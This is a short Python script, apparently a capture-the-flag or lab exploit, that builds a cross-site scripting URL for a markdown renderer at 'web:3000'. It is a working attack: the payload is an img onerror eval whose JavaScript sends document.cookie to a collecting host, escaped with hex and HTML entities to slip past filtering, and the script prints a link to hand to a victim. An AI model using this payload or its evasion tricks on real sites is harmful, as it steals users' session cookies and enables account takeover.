#!/bin/python3
import os
from urllib.parse import quote

HOST = os.environ.get("LOCALHOST", "http://127.0.0.1/")

js_code = (
    f"""
fetch('{HOST}?'+document.cookie)
""".replace("\n", "")
    .replace(" ", "")
    .replace("'", "\\x27")
    .replace("https://", "https\\x3a//")
)

evil_md = f"<img src=x onerror=eval('{js_code}')>".replace("<", "&lt;").replace(
    ">", "&gt;"
)

url = f"http://web:3000/?markdown={quote(evil_md)}"
print(f"Open this URL in your browser: {url}")
